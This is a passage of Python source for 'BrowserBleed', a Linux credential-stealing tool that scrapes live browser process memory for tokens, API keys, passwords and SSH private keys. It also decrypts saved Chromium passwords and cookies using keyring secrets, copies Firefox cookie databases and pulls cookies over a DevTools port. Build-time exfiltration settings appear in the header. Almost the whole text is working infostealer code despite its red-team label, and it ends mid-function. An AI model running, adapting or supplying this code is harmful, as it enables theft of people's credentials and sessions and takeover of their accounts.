"""
BrowserBleed - Browser Credential & Memory Extractor (Linux)
Authorized Red Team / Research Use Only

Default: tries everything - disk extraction + live memory scrape on all browsers.
Run as root for full coverage (/proc/<pid>/mem access requires root or ptrace_scope=0).

Usage:
  sudo ./BrowserBleed_linux                        # all browsers, disk + memory
  sudo ./BrowserBleed_linux --browser chrome       # target one browser
  sudo ./BrowserBleed_linux --disk-only            # skip memory scraping
  sudo ./BrowserBleed_linux --memory-only          # skip disk extraction
  sudo ./BrowserBleed_linux --out /tmp/results.txt # custom output path
  sudo ./BrowserBleed_linux --max-hits 500         # raise memory hit cap
  sudo ./BrowserBleed_linux --verify               # verify tokens (outbound requests)
"""

import os
import sys
import json
import base64
import sqlite3
import shutil
import hashlib
import tempfile
import time
import re
import subprocess
import argparse
import socket
import struct
import http.client
import urllib.parse
import urllib.request
import urllib.error
from datetime import datetime, timedelta, timezone
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.backends import default_backend
    _CRYPTO_OK = True
except ImportError:
    _CRYPTO_OK = False

if sys.stdout is not None:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")

_do_oidc: bool = False

# Build-time exfil defaults - substituted by build_linux.sh.
_EXFIL_URL: str = ""
_EXFIL_KEY: str = ""

# Resolve the real user's home directory (important when invoked via sudo)
HOME = os.path.expanduser("~")
if os.geteuid() == 0:
    _sudo_user = os.environ.get("SUDO_USER")
    if _sudo_user:
        try:
            import pwd
            HOME = pwd.getpwnam(_sudo_user).pw_dir
        except Exception:
            pass


def is_root() -> bool:
    return os.geteuid() == 0


# ── Process utilities ──────────────────────────────────────────────────────────
def find_pids(name: str) -> list[int]:
    """Find PIDs whose /proc/<pid>/exe basename or comm matches name."""
    pids   = []
    name_l = name.lower()
    try:
        entries = os.listdir("/proc")
    except OSError:
        return []
    for entry in entries:
        if not entry.isdigit():
            continue
        pid = int(entry)
        try:
            exe = os.readlink(f"/proc/{pid}/exe")
            if os.path.basename(exe).lower() == name_l:
                pids.append(pid)
                continue
        except OSError:
            pass
        try:
            with open(f"/proc/{pid}/comm") as f:
                comm = f.read().strip().lower()
            # comm is truncated to 15 chars by the kernel
            if comm == name_l or name_l.startswith(comm):
                pids.append(pid)
        except OSError:
            pass
    return list(set(pids))


def is_process_running(name: str) -> bool:
    return bool(find_pids(name))


def _pid_site_map(process_name: str) -> dict[int, str]:
    sites: dict[int, str] = {}
    for name in _CHROMIUM_ALT_NAMES.get(process_name, [process_name]):
        for pid in find_pids(name):
            try:
                with open(f"/proc/{pid}/cmdline", "rb") as f:
                    cmdline = f.read().replace(b"\x00", b" ").decode(errors="replace")
                m = re.search(r"--site-instance-site=(https?://[^\s,\"]+)", cmdline)
                if m:
                    sites[pid] = m.group(1)
            except OSError:
                pass
    return sites


# ── Memory scraping ────────────────────────────────────────────────────────────
CREDENTIAL_PATTERNS: dict[str, re.Pattern] = {
    "JWT token":            re.compile(rb"eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}"),
    "Bearer token":         re.compile(rb"(?i)Bearer\s+[A-Za-z0-9\-._~+/]{20,}"),
    "Authorization header": re.compile(rb"Authorization:\s*[A-Za-z]+\s+[A-Za-z0-9\-._~+/=]{20,}"),
    "Cookie header":        re.compile(rb"Cookie:\s*[\x20-\x7e]{40,512}"),
    "Set-Cookie header":    re.compile(rb"Set-Cookie:\s*[\x20-\x7e]{20,512}"),
    "OAuth access_token":   re.compile(rb"(?i)access_?token[\"'\s]*[=:][\"'\s]*([A-Za-z0-9\-._~+/=]{20,256})(?=[\"'\s\x00&,;:\r\n]|$)"),
    "OAuth refresh_token":  re.compile(rb"(?i)refresh_?token[\"'\s]*[=:][\"'\s]*([A-Za-z0-9\-._~+/=]{20,256})(?=[\"'\s\x00&,;:\r\n]|$)"),
    "Session token":        re.compile(rb"(?i)session[_-]?token[\"'\s]*[=:][\"'\s]*([A-Za-z0-9\-._~+/=%]{20,256})"),
    "Session ID":           re.compile(rb"(?i)session[_-]?id[\"'\s]*[=:][\"'\s]*([A-Fa-f0-9\-]{16,128})"),
    "Password (POST body)": re.compile(rb"(?im)(?:^|&|\?)password=([A-Za-z0-9!@#$%^&*()\-_+=,.?:;~]{8,128})(?:&|$|\s|\x00)"),
    "Password (JSON/API)":  re.compile(rb'(?i)"password"\s*:\s*"([A-Za-z0-9!@#$%^&*()\-_+=,.?:;~]{8,128})"'),
    "Google SAPISID":       re.compile(rb"SAPISID=[A-Za-z0-9_/\-]{20,}"),
    "Slack token":          re.compile(rb"xox[baprs]-[A-Za-z0-9\-]{10,}"),
    "GitHub token":         re.compile(rb"gh[pousr]_[A-Za-z0-9]{36,}"),
    "Discord token":        re.compile(rb"[MN][A-Za-z0-9]{23}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27}"),
    "AWS Access Key":       re.compile(rb"A(?:KIA|SIA|ROA|IDA)[A-Z0-9]{16}"),
    "Stripe key":           re.compile(rb"sk_(?:live|test)_[A-Za-z0-9]{24,}"),
    "npm token":            re.compile(rb"npm_[A-Za-z0-9]{36}"),
    "HuggingFace token":    re.compile(rb"hf_[A-Za-z0-9]{34,}"),
    "Vault token":          re.compile(rb"hvs\.[A-Za-z0-9]{90,}"),
    "Anthropic API key":    re.compile(rb"sk-ant-[A-Za-z0-9\-_]{90,}"),
    "SSH private key":      re.compile(rb"(-----BEGIN (?:[A-Z ]+ )?PRIVATE KEY-----[^-]{100,4096}-----END (?:[A-Z ]+ )?PRIVATE KEY-----)"),
}

_NOISE_BYTES = re.compile(
    rb'%[a-z]'
    rb'|\{[a-zA-Z_][a-zA-Z0-9_]*\}'
    rb'|"type":"string"'
    rb'|:\s*boolean[,\s]'
    rb'|JwkSymKey'
    rb'|LoggableString'
    rb'|\(function\s*\('
    rb'|\|\|\(\w+=\{\}\)\)'
    rb'|[a-z]\.[a-zA-Z]+\.[a-zA-Z]+[Tt]oken'
)

_NOISE_EXACT: frozenset[str] = frozenset([
    "Password=true",
    "password://settings/developers",
])

_HIT_TIER: dict[str, int] = {
    "AWS Access Key": 0, "Anthropic API key": 0,
    "SSH private key": 0, "Stripe key": 0,
    "Vault token": 0, "GitHub token": 0,
    "Slack token": 0, "Discord token": 0,
    "npm token": 0, "HuggingFace token": 0,
    "Password (POST body)": 1, "Password (JSON/API)": 1,
    "JWT token": 1, "Bearer token": 1, "Authorization header": 1,
    "Google SAPISID": 1, "OAuth access_token": 1, "OAuth refresh_token": 1,
    "Session token": 1,
    "Session ID": 2, "Cookie header": 2, "Set-Cookie header": 2,
}

_QUICK_PREFIXES: tuple[bytes, ...] = (
    b"eyJ", b"Bearer ", b"Authorization:", b"Cookie:", b"Set-Cookie:",
    b"access_token", b"refresh_token", b"session_token", b"session_id",
    b"password", b"SAPISID=", b"xox",
    b"ghp_", b"gho_", b"ghu_", b"ghs_", b"ghr_",
    b"sk_live_", b"sk_test_", b"npm_", b"hf_", b"hvs.", b"sk-ant-",
    b"AKIA", b"ASIA", b"AROA", b"AIDA", b"-----BEGIN",
)

# Regions that cannot be read via /proc/<pid>/mem
_SKIP_REGIONS: frozenset[str] = frozenset(["[vsyscall]", "[vvar]", "[vdso]"])


def _has_credential_hint(data: bytes) -> bool:
    return any(p in data for p in _QUICK_PREFIXES)


def _is_noise(raw: bytes, decoded: str) -> bool:
    if decoded.strip() in _NOISE_EXACT:
        return True
    return bool(_NOISE_BYTES.search(raw))


def _trunc(val: str, n: int = 80) -> str:
    return val[:n] + "…" if len(val) > n else val


def scrape_pid(pid: int, max_hits: int = 300, chunk: int = 65536) -> list[dict]:
    maps_path = f"/proc/{pid}/maps"
    mem_path  = f"/proc/{pid}/mem"

    try:
        with open(maps_path) as f:
            maps_lines = f.readlines()
    except OSError as e:
        raise PermissionError(f"Cannot read {maps_path}: {e}")

    try:
        mem_fd = os.open(mem_path, os.O_RDONLY)
    except OSError as e:
        raise PermissionError(f"Cannot open {mem_path}: {e}")

    raw_hits: list[dict] = []

    try:
        for line in maps_lines:
            if len(raw_hits) >= max_hits:
                break

            parts    = line.split()
            if len(parts) < 2:
                continue
            perms    = parts[1]
            pathname = parts[5] if len(parts) > 5 else ""

            if "r" not in perms:
                continue
            if pathname in _SKIP_REGIONS:
                continue

            addr_parts = parts[0].split("-")
            if len(addr_parts) != 2:
                continue
            try:
                start = int(addr_parts[0], 16)
                end   = int(addr_parts[1], 16)
            except ValueError:
                continue

            region_size = end - start
            if region_size <= 0 or region_size > 2 * 1024 * 1024 * 1024:
                continue

            prev_data   = b""
            overlap_len = 512

            for offset in range(0, region_size, chunk):
                read_size = min(chunk, region_size - offset)
                try:
                    os.lseek(mem_fd, start + offset, os.SEEK_SET)
                    data = os.read(mem_fd, read_size)
                except OSError:
                    prev_data = b""
                    continue

                if not data or not data.rstrip(b"\x00"):
                    prev_data = b""
                    continue

                if not _has_credential_hint(data) and not (prev_data and _has_credential_hint(prev_data[-overlap_len:])):
                    prev_data = data
                    continue

                overlap     = prev_data[-overlap_len:]
                search_data = overlap + data

                for label, pat in CREDENTIAL_PATTERNS.items():
                    for m in pat.finditer(search_data):
                        if m.end() <= len(overlap):
                            continue
                        raw_match    = m.group()
                        full_decoded = raw_match.decode(errors="replace")
                        if not _is_noise(raw_match, full_decoded):
                            value      = m.group(m.lastindex).decode(errors="replace") if m.lastindex else full_decoded
                            match_addr = start + offset + m.start() - len(overlap)
                            pre        = prev_data[-2048:] if prev_data else b""
                            ctx        = pre + data[:min(len(data), m.end() + 2048)]
                            raw_hits.append({
                                "label":     label,
                                "address":   hex(match_addr),
                                "value":     value,
                                "dedup_key": f"{label}:{value[:80]}",
                                "pid":       pid,
                                "context":   ctx,
                            })

                prev_data = data
                if len(raw_hits) >= max_hits:
                    break
    finally:
        os.close(mem_fd)

    return raw_hits


def deduplicate(hits: list[dict]) -> list[dict]:
    groups: dict[str, list[dict]] = {}
    for h in hits:
        key = f"{h['label']}:{h['value'][:50]}"
        groups.setdefault(key, []).append(h)
    result = [min(g, key=lambda h: len(h["value"])) for g in groups.values()]

    by_label: dict[str, list[dict]] = {}
    for h in result:
        by_label.setdefault(h["label"], []).append(h)

    final: list[dict] = []
    for label, group in by_label.items():
        group.sort(key=lambda h: len(h["value"]))
        kept: list[dict] = []
        for h in group:
            v        = h["value"]
            upgraded = False
            for i, k in enumerate(kept):
                if len(k["value"]) >= 20 and v.startswith(k["value"]):
                    kept[i]  = h
                    upgraded = True
                    break
            if not upgraded:
                kept.append(h)
        final.extend(kept)

    final.sort(key=lambda h: int(h["address"], 16))
    return final


# ── Browser config ─────────────────────────────────────────────────────────────
# Each Chromium-based spec: (display_name, [process_names], [profile_path_candidates])
# Paths are tried in order — first existing dir wins; otherwise the first path is used
# so "Not installed" still appears in the report.
# process_names[0] is the primary key; the rest are distro/snap aliases.
_CHROMIUM_SPECS: list[tuple[str, list[str], list[str]]] = [
    ("Google Chrome",
     ["chrome", "google-chrome", "google-chrome-stable",
      "google-chrome-beta", "google-chrome-unstable"],
     [os.path.join(HOME, ".config", "google-chrome"),
      os.path.join(HOME, "snap", "google-chrome", "current", ".config", "google-chrome"),
      os.path.join(HOME, ".var", "app", "com.google.Chrome", "config", "google-chrome")]),

    ("Chromium",
     ["chromium", "chromium-browser", "chromium-freeworld"],
     [os.path.join(HOME, ".config", "chromium"),
      os.path.join(HOME, "snap", "chromium", "current", ".config", "chromium"),
      os.path.join(HOME, ".var", "app", "org.chromium.Chromium", "config", "chromium")]),

    ("Brave",
     ["brave", "brave-browser", "brave-browser-stable"],
     [os.path.join(HOME, ".config", "BraveSoftware", "Brave-Browser"),
      os.path.join(HOME, "snap", "brave", "current", ".config", "BraveSoftware", "Brave-Browser"),
      os.path.join(HOME, ".var", "app", "com.brave.Browser", "config", "BraveSoftware", "Brave-Browser")]),

    ("Microsoft Edge",
     ["msedge", "microsoft-edge", "microsoft-edge-stable",
      "microsoft-edge-beta", "microsoft-edge-dev"],
     [os.path.join(HOME, ".config", "microsoft-edge"),
      os.path.join(HOME, ".config", "microsoft-edge-beta"),
      os.path.join(HOME, ".config", "microsoft-edge-dev"),
      os.path.join(HOME, "snap", "microsoft-edge", "current", ".config", "microsoft-edge"),
      os.path.join(HOME, ".var", "app", "com.microsoft.Edge", "config", "microsoft-edge")]),

    ("Vivaldi",
     ["vivaldi", "vivaldi-stable", "vivaldi-bin"],
     [os.path.join(HOME, ".config", "vivaldi"),
      os.path.join(HOME, ".config", "vivaldi-snapshot"),
      os.path.join(HOME, ".var", "app", "com.vivaldi.Vivaldi", "config", "vivaldi")]),

    ("Opera",
     ["opera", "opera-stable"],
     [os.path.join(HOME, ".config", "opera"),
      os.path.join(HOME, "snap", "opera", "current", ".config", "opera"),
      os.path.join(HOME, ".var", "app", "com.opera.Opera", "config", "opera")]),

    ("Opera GX",
     ["opera-gx"],
     [os.path.join(HOME, ".config", "opera-gx")]),

    ("Yandex Browser",
     ["yandex-browser", "yandex_browser"],
     [os.path.join(HOME, ".config", "yandex-browser"),
      os.path.join(HOME, ".config", "yandex-browser-beta")]),
]

def _resolve_chromium_browsers() -> list[tuple[str, str, str]]:
    result = []
    for name, procs, paths in _CHROMIUM_SPECS:
        resolved = next((p for p in paths if os.path.isdir(p)), paths[0])
        result.append((name, procs[0], resolved))
    return result

BROWSERS = _resolve_chromium_browsers()

# Maps primary process name → all known aliases (exe basename or comm)
_CHROMIUM_ALT_NAMES: dict[str, list[str]] = {
    procs[0]: procs for _, procs, _ in _CHROMIUM_SPECS
}

# Firefox-family specs: (display_name, [process_names], [profile_dir_candidates])
# These use sqlite cookies.sqlite — no Chromium-style encryption.
_FIREFOX_SPECS: list[tuple[str, list[str], list[str]]] = [
    ("Firefox",
     ["firefox", "firefox-esr", "firefox-bin"],
     [os.path.join(HOME, ".mozilla", "firefox"),
      os.path.join(HOME, "snap", "firefox", "common", ".mozilla", "firefox"),
      os.path.join(HOME, ".var", "app", "org.mozilla.firefox", ".mozilla", "firefox")]),

    ("Firefox ESR",
     ["firefox-esr"],
     [os.path.join(HOME, ".mozilla", "firefox")]),  # shares profile dir with Firefox

    ("LibreWolf",
     ["librewolf"],
     [os.path.join(HOME, ".librewolf"),
      os.path.join(HOME, "snap", "librewolf", "common", ".librewolf"),
      os.path.join(HOME, ".var", "app", "io.gitlab.librewolf-community", ".librewolf")]),

    ("Waterfox",
     ["waterfox", "waterfox-current", "waterfox-classic"],
     [os.path.join(HOME, ".waterfox"),
      os.path.join(HOME, ".var", "app", "net.waterfox.waterfox", ".waterfox")]),

    ("Tor Browser",
     ["firefox", "tor-browser"],
     [os.path.join(HOME, ".local", "share", "torbrowser", "tbb", "x86_64",
                   "tor-browser_en-US", "Browser", "TorBrowser", "Data", "Browser"),
      os.path.join(HOME, "tor-browser", "Browser", "TorBrowser", "Data", "Browser"),
      os.path.join(HOME, ".local", "share", "torbrowser", "tbb", "x86_64",
                   "tor-browser", "Browser", "TorBrowser", "Data", "Browser")]),
]


def _get_profiles(user_data_path: str) -> list[tuple[str, str]]:
    profiles = []
    default  = os.path.join(user_data_path, "Default")
    if os.path.isdir(default):
        profiles.append(("Default", default))
    for i in range(1, 20):
        p = os.path.join(user_data_path, f"Profile {i}")
        if os.path.isdir(p):
            profiles.append((f"Profile {i}", p))
    guest = os.path.join(user_data_path, "Guest Profile")
    if os.path.isdir(guest):
        profiles.append(("Guest Profile", guest))
    return profiles


# ── Crypto ─────────────────────────────────────────────────────────────────────
def _get_keyring_password(app_name: str = "Chrome") -> str:
    """Retrieve the Safe Storage password from GNOME keyring or KWallet; fall back to 'peanuts'."""
    # GNOME keyring via secretstorage
    try:
        import secretstorage
        bus  = secretstorage.dbus_init()
        coll = secretstorage.get_default_collection(bus)
        if coll.is_locked():
            coll.unlock()
        for item in coll.get_all_items():
            if "Safe Storage" in item.get_label() and app_name.lower() in item.get_label().lower():
                return item.get_secret().decode("utf-8", errors="replace")
    except Exception:
        pass

    # KWallet via command line
    try:
        r = subprocess.run(
            ["kwallet-query", "-r", f"{app_name} Keys", "kdewallet"],
            capture_output=True, text=True, timeout=5,
        )
        if r.returncode == 0 and r.stdout.strip():
            return r.stdout.strip()
    except Exception:
        pass

    # secret-tool (libsecret CLI)
    try:
        r = subprocess.run(
            ["secret-tool", "lookup", "application", app_name.lower()],
            capture_output=True, text=True, timeout=5,
        )
        if r.returncode == 0 and r.stdout.strip():
            return r.stdout.strip()
    except Exception:
        pass

    return "peanuts"


_key_cache: dict[str, bytes] = {}


def _app_name_for_path(user_data_path: str) -> str:
    p = user_data_path.lower()
    if "brave" in p:                                          return "Brave"
    if "chromium" in p:                                       return "Chromium"
    if "microsoft-edge" in p or "msedge" in p \
            or "com.microsoft.edge" in p:                     return "Microsoft Edge"
    if "vivaldi" in p:                                        return "Vivaldi"
    if "opera-gx" in p:                                       return "Opera"
    if "opera" in p or "com.opera" in p:                      return "Opera"
    if "yandex" in p:                                         return "Yandex Browser"
    return "Chrome"


def get_encryption_key(user_data_path: str) -> bytes:
    """Derive the AES-128 key used for v10/v11 encrypted SQLite values on Linux."""
    app_name = _app_name_for_path(user_data_path)
    if app_name in _key_cache:
        return _key_cache[app_name]
    password = _get_keyring_password(app_name)
    # Linux Chrome uses 1 PBKDF2 iteration (macOS uses 1003)
    key = hashlib.pbkdf2_hmac("sha1", password.encode("utf-8"), b"saltysalt", 1, 16)
    _key_cache[app_name] = key
    return key


def decrypt_value(key: bytes, enc: bytes) -> str:
    if not enc:
        return ""
    if enc[:3] in (b"v10", b"v11"):
        if not _CRYPTO_OK:
            return "<cryptography package not installed>"
        try:
            cipher_data = enc[3:]
            iv          = b" " * 16
            cipher      = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
            decryptor   = cipher.decryptor()
            padded      = decryptor.update(cipher_data) + decryptor.finalize()
            pad_len     = padded[-1] if padded else 0
            if 1 <= pad_len <= 16:
                return padded[:-pad_len].decode("utf-8", errors="replace")
            return padded.decode("utf-8", errors="replace")
        except Exception as e:
            return f"<decrypt error: {e}>"
    if enc[:3] == b"v20":
        return "<v20 app-bound encryption: not supported on Linux>"
    try:
        return enc.decode("utf-8", errors="replace")
    except Exception:
        return ""


def chrome_epoch_to_str(us: int) -> str:
    if not us:
        return "session"
    try:
        return (datetime(1601, 1, 1, tzinfo=timezone.utc) + timedelta(microseconds=us)).strftime("%Y-%m-%d %H:%M:%S UTC")
    except Exception:
        return str(us)


# ── File copy utilities ────────────────────────────────────────────────────────
def copy_db_with_wal(src: str) -> str:
    """Copy a SQLite DB and its -wal/-shm companions to a temp dir. Returns path to the copy."""
    tmp_dir = tempfile.mkdtemp()
    db_name = os.path.basename(src)
    tmp_db  = os.path.join(tmp_dir, db_name)
    try:
        shutil.copy2(src, tmp_db)
    except Exception as e:
        shutil.rmtree(tmp_dir, ignore_errors=True)
        raise OSError(f"Could not copy {src}: {e}")
    for suffix in ("-wal", "-shm"):
        companion = src + suffix
        if os.path.exists(companion):
            try:
                shutil.copy2(companion, tmp_db + suffix)
            except Exception:
                pass
    return tmp_db


def sqlite_connect(path: str) -> sqlite3.Connection:
    return sqlite3.connect(path, timeout=2.0)


def sqlite_execute(conn: sqlite3.Connection, query: str, retries: int = 8, delay: float = 0.25):
    last_err = None
    for _ in range(retries):
        try:
            return list(conn.execute(query))
        except sqlite3.OperationalError as e:
            if "locked" in str(e).lower():
                last_err = e
                time.sleep(delay)
            else:
                raise
    raise last_err


# ── Disk extraction ────────────────────────────────────────────────────────────
def extract_credentials(profile_path: str, key: bytes) -> list[dict]:
    db_path = os.path.join(profile_path, "Login Data")
    if not os.path.exists(db_path):
        return []
    tmp_dir = None
    try:
        tmp_db  = copy_db_with_wal(db_path)
        tmp_dir = os.path.dirname(tmp_db)
        conn    = sqlite_connect(tmp_db)
        results = [
            {"url": url, "username": user, "password": decrypt_value(key, enc) if enc else ""}
            for url, user, enc in sqlite_execute(conn,
                "SELECT origin_url, username_value, password_value FROM logins"
            )
        ]
        conn.close()
        return results
    finally:
        if tmp_dir:
            shutil.rmtree(tmp_dir, ignore_errors=True)


def _query_cookies(conn: sqlite3.Connection, key: bytes) -> list[dict]:
    try:
        rows = sqlite_execute(conn,
            "SELECT host_key, name, value, encrypted_value, path, "
            "expires_utc, is_secure, is_httponly, samesite FROM cookies"
        )
        results = []
        for host, name, value, enc, path, exp, secure, httponly, samesite in rows:
            samesite_str = {0: "None", 1: "Lax", 2: "Strict"}.get(samesite, str(samesite))
            results.append({
                "host": host, "name": name,
                "value": decrypt_value(key, enc) if enc else value,
                "path": path, "expires": chrome_epoch_to_str(exp),
                "secure": bool(secure), "httponly": bool(httponly),
                "samesite": samesite_str,
            })
        return results
    except sqlite3.OperationalError:
        rows = sqlite_execute(conn,
            "SELECT host_key, name, value, encrypted_value, path, "
            "expires_utc, is_secure, is_httponly FROM cookies"
        )
        results = []
        for host, name, value, enc, path, exp, secure, httponly in rows:
            results.append({
                "host": host, "name": name,
                "value": decrypt_value(key, enc) if enc else value,
                "path": path, "expires": chrome_epoch_to_str(exp),
                "secure": bool(secure), "httponly": bool(httponly),
                "samesite": "?",
            })
        return results


def extract_cookies(profile_path: str, key: bytes) -> list[dict]:
    for candidate in [os.path.join("Network", "Cookies"), "Cookies"]:
        db_path = os.path.normpath(os.path.join(profile_path, candidate))
        if os.path.exists(db_path):
            break
    else:
        return []

    # Attempt 1: immutable URI read (avoids lock conflicts)
    try:
        uri  = "file://" + db_path + "?mode=ro&immutable=1"
        conn = sqlite3.connect(uri, uri=True)
        results = _query_cookies(conn, key)
        conn.close()
        if results:
            return results
    except Exception:
        pass

    # Attempt 2: copy + read
    tmp_dir = None
    try:
        tmp_db  = copy_db_with_wal(db_path)
        tmp_dir = os.path.dirname(tmp_db)
        conn    = sqlite_connect(tmp_db)
        results = _query_cookies(conn, key)
        conn.close()
        return results
    except Exception as e:
        raise RuntimeError(f"Cookie extraction failed: {e}") from e
    finally:
        if tmp_dir:
            shutil.rmtree(tmp_dir, ignore_errors=True)


# ── Firefox-family cookie extraction ──────────────────────────────────────────
def _resolve_firefox_spec(spec_paths: list[str]) -> str | None:
    """Return first existing profile directory from a Firefox-family spec path list."""
    return next((p for p in spec_paths if os.path.isdir(p)), None)


def _extract_moz_cookies(profiles_dir: str, browser_name: str) -> list[dict]:
    """Extract cookies from all profiles in a Mozilla-style profiles directory."""
    results = []
    try:
        entries = os.listdir(profiles_dir)
    except OSError:
        return results
    for profile_name in entries:
        db_path = os.path.join(profiles_dir, profile_name, "cookies.sqlite")
        if not os.path.exists(db_path):
            continue
        tmp_dir = None
        try:
            tmp_db  = copy_db_with_wal(db_path)
            tmp_dir = os.path.dirname(tmp_db)
            conn    = sqlite_connect(tmp_db)
            try:
                rows = sqlite_execute(conn,
                    "SELECT host, name, value, path, expiry, isSecure, isHttpOnly, sameSite FROM moz_cookies"
                )
                for host, name, value, path, expiry, secure, httponly, samesite in rows:
                    samesite_str = {0: "None", 1: "Lax", 2: "Strict"}.get(samesite, str(samesite))
                    results.append({
                        "browser": browser_name,
                        "profile": profile_name,
                        "host": host, "name": name, "value": value,
                        "path": path,
                        "expires": datetime.fromtimestamp(expiry, tz=timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC") if expiry else "session",
                        "secure": bool(secure), "httponly": bool(httponly),
                        "samesite": samesite_str,
                    })
            except Exception:
                pass
            conn.close()
        except Exception:
            pass
        finally:
            if tmp_dir:
                shutil.rmtree(tmp_dir, ignore_errors=True)
    return results


def extract_all_firefox_family() -> list[tuple[str, list[str], str | None, list[dict]]]:
    """
    Returns one entry per Firefox-family browser spec:
      (display_name, process_names, resolved_profiles_dir_or_None, cookies)
    Deduplicates profile dirs so shared dirs (e.g. Firefox + Firefox ESR) are only
    read once.
    """
    seen_dirs: set[str] = set()
    results = []
    for name, procs, paths in _FIREFOX_SPECS:
        profiles_dir = _resolve_firefox_spec(paths)
        if profiles_dir and profiles_dir in seen_dirs:
            continue  # already extracted (e.g. Firefox ESR shares Firefox's dir)
        cookies = _extract_moz_cookies(profiles_dir, name) if profiles_dir else []
        if profiles_dir:
            seen_dirs.add(profiles_dir)
        results.append((name, procs, profiles_dir, cookies))
    return results


# ── CDP cookie extraction ──────────────────────────────────────────────────────
def unix_ts_to_str(ts: float) -> str:
    if ts <= 0:
        return "session"
    try:
        return datetime.fromtimestamp(ts, tz=timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
    except Exception:
        return str(ts)


def _cdp_find_port(process_name: str) -> int | None:
    all_pids: list[int] = []
    for name in _CHROMIUM_ALT_NAMES.get(process_name, [process_name]):
        all_pids.extend(find_pids(name))
    for pid in all_pids:
        try:
            with open(f"/proc/{pid}/cmdline", "rb") as f:
                cmdline = f.read().replace(b"\x00", b" ").decode(errors="replace")
            m = re.search(r"--remote-debugging-port=(\d+)", cmdline)
            if m:
                return int(m.group(1))
        except OSError:
            pass
    for port in (9222, 9229, 9223, 9224):
        try:
            conn = http.client.HTTPConnection("localhost", port, timeout=1)
            conn.request("GET", "/json/version")
            resp = conn.getresponse()
            if resp.status == 200:
                data = json.loads(resp.read().decode(errors="replace"))
                if "webSocketDebuggerUrl" in data or "Browser" in data:
                    return port
        except Exception:
            pass
    return None


def _ws_connect(host: str, port: int, path: str) -> socket.socket:
    s   = socket.create_connection((host, port), timeout=8)
    s.settimeout(15)
    key = base64.b64encode(os.urandom(16)).decode()
    hs  = (f"GET {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
           f"Upgrade: websocket\r\nConnection: Upgrade\r\n"
           f"Sec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n"
           f"Origin: http://localhost\r\n\r\n")
    s.sendall(hs.encode())
    buf = b""
    while b"\r\n\r\n" not in buf:
        chunk = s.recv(4096)
        if not chunk:
            raise ConnectionError("WebSocket handshake incomplete")
        buf += chunk
    if b" 101 " not in buf.split(b"\r\n")[0]:
        raise ConnectionError(f"WebSocket upgrade failed: {buf[:200]!r}")
    return s


def _ws_send(s: socket.socket, msg: str) -> None:
    payload = msg.encode()
    mask    = os.urandom(4)
    masked  = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
    n       = len(payload)
    if n < 126:
        header = bytes([0x81, 0x80 | n]) + mask
    elif n < 65536:
        header = bytes([0x81, 0xFE]) + struct.pack(">H", n) + mask
    else:
        header = bytes([0x81, 0xFF]) + struct.pack(">Q", n) + mask
    s.sendall(header + masked)


def _ws_read_frame(s: socket.socket) -> tuple[bool, int, bytes]:
    def recv_exact(n: int) -> bytes:
        buf = b""
        while len(buf) < n:
            chunk = s.recv(n - len(buf))
            if not chunk:
                raise ConnectionError("WebSocket connection closed")
            buf += chunk
        return buf

    h      = recv_exact(2)
    fin    = bool(h[0] & 0x80)
    opcode = h[0] & 0x0F
    masked = bool(h[1] & 0x80)
    n      = h[1] & 0x7F
    if n == 126:
        n = struct.unpack(">H", recv_exact(2))[0]
    elif n == 127:
        n = struct.unpack(">Q", recv_exact(8))[0]
    mask_key = recv_exact(4) if masked else b""
    raw      = recv_exact(n)
    payload  = bytes(b ^ mask_key[i % 4] for i, b in enumerate(raw)) if masked else raw
    return fin, opcode, payload


_WS_MAX_FRAMES = 1000
_WS_MAX_BYTES  = 64 * 1024 * 1024


def _ws_recv_msg(s: socket.socket) -> str:
    parts       = []
    total_bytes = 0
    frame_count = 0
    while True:
        fin, opcode, payload = _ws_read_frame(s)
        if opcode == 9:
            mask = os.urandom(4)
            pong = bytes([0x8A, 0x80 | len(payload)]) + mask + bytes(
                b ^ mask[i % 4] for i, b in enumerate(payload)
            )
            s.sendall(pong)
            continue
        if opcode == 8:
            raise ConnectionError("WebSocket closed by server")
        frame_count += 1
        total_bytes += len(payload)
        if frame_count > _WS_MAX_FRAMES:
            raise RuntimeError(f"WebSocket: too many frames (>{_WS_MAX_FRAMES})")
        if total_bytes > _WS_MAX_BYTES:
            raise RuntimeError(f"WebSocket: message too large (>{_WS_MAX_BYTES} bytes)")
        parts.append(payload)
        if fin:
            break
    return b"".join(parts).decode(errors="replace")


def _cdp_call(ws_url: str, method: str, params: dict | None = None) -> dict | None:
    parsed = urllib.parse.urlparse(ws_url)
    host   = parsed.hostname or "localhost"
    port   = parsed.port or 80
    path   = parsed.path
    s = _ws_connect(host, port, path)
    try:
        _ws_send(s, json.dumps({"id": 1, "method": method, "params": params or {}}))
        skip_count = 0
        while True:
            data = json.loads(_ws_recv_msg(s))
            if data.get("id") == 1:
                return data.get("result")
            skip_count += 1
            if skip_count > 500:
                return None
    except Exception:
        return None
    finally:
        try:
            s.close()
        except Exception:
            pass


def extract_cookies_cdp(process_name: str) -> list[dict]:
    port = _cdp_find_port(process_name)
    if port is None:
        return []
    try:
        conn    = http.client.HTTPConnection("localhost", port, timeout=5)
        conn.request("GET", "/json")
        resp    = conn.getresponse()
        targets = json.loads(resp.read().decode(errors="replace"))
        ws_url  = next(
            (t["webSocketDebuggerUrl"] for t in targets if t.get("webSocketDebuggerUrl")),
            None,
        )
        if not ws_url:
            return []
    except Exception:
        return []
    result = _cdp_call(ws_url, "Network.getAllCookies")
    if not result:
        return []
    cookies = []
    for ck in result.get("cookies", []):
        cookies.append({
            "host":     ck.get("domain", ""),
            "name":     ck.get("name", ""),
            "value":    ck.get("value", ""),
            "path":     ck.get("path", ""),
            "expires":  unix_ts_to_str(ck.get("expires", -1)),
            "secure":   ck.get("secure", False),
            "httponly": ck.get("httpOnly", False),
            "samesite": ck.get("sameSite", "") or "None",
            "cdp_only": False,
        })
    return cookies


def _merge_cdp_cookies(disk: list[dict], cdp: list[dict]) -> list[dict]:
